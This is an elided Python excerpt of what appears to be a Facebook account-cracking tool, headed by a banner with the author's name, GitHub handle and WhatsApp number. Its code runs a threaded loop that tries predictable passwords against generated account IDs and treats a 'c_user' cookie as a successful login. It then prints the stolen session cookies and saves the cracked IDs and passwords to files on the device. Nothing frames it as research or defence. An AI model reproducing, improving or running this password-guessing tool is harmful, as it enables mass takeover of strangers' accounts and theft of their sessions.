...
print("""\x1b[1;97m                
    ...
    ┌───────────────────────────────────────┐
    │\033[1;33m [✓] AUTHOR   : Mamun Islam               
    │\033[1;34m [✓] GITHUB   : M4M7N                     
    │\033[1;35m [✓] WHATSAPP : +8801304790957          
    │\033[1;36m [✓] TOOLS    : Free Tools    
    │\033[1;32m [✓] VRISON   : 2.3                  
    └───────────────────────────────────────┘""") 
loop = 0
oks = []
cps = []
...
def ak():
    ...
    with ThreadPool(max_workers=35) as setu:
        ...
        for love in user:
            uid = code+love
            pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','free fire','i fuck you']
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[MAMUN-OK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196mâ€¢\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/MAMUN-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[MAMUN-CP] '+uid+ ' | ' +ps+'')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[MAMUN-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/MAMUN-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
